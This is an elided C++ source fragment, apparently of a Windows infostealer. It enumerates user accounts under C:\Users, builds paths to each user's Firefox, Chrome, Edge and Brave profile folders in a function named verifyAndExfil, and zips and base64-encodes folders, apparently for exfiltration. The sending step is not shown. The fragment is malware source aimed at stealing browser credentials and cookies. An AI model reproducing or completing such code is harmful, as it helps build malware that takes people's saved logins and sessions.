...
std::string zipIt(const std::string& folder_path) {
    ...
    std::string zip_base64 = base64Encode(reinterpret_cast<const unsigned char*>(zip_buffer), zip_size);
...
void verifyAndExfil(std::vector<std::string> listUsername) {
    
    for (size_t i = 0; i < listUsername.size(); i++) {
        std::string pathFirefox = "C:\\Users\\" + listUsername[i] + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\Default";
        std::string pathChrome = "C:\\Users\\" + listUsername[i] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default";
        std::string pathEdge = "C:\\Users\\" + listUsername[i] + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default";
        std::string pathBrave = "C:\\Users\\" + listUsername[i] + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Default";
...
std::vector<std::string> listUsernames() {
    ...
    hFind = FindFirstFileW(L"C:\\Users\\*", &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
    ...
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            int len = WideCharToMultiByte(CP_ACP, 0, ffd.cFileName, -1, NULL, 0, NULL, NULL);
            char* narrow_str = new char[len];
            WideCharToMultiByte(CP_ACP, 0, ffd.cFileName, -1, narrow_str, len, NULL, NULL);

            if (_tcscmp(ffd.cFileName, _T(".")) == 0 || _tcscmp(ffd.cFileName, _T("..")) == 0 || _tcscmp(ffd.cFileName, _T("All Users")) == 0
                || _tcscmp(ffd.cFileName, _T("Default")) == 0 || _tcscmp(ffd.cFileName, _T("Default User")) == 0 || _tcscmp(ffd.cFileName, _T("Public")) == 0) {
                continue;
            }
            folders.push_back(narrow_str);
            delete[] narrow_str;
        }
...
int main()
{
    std::vector<std::string> listUsername;
    listUsername = listUsernames();
    bool result;
    verifyAndExfil(listUsername);
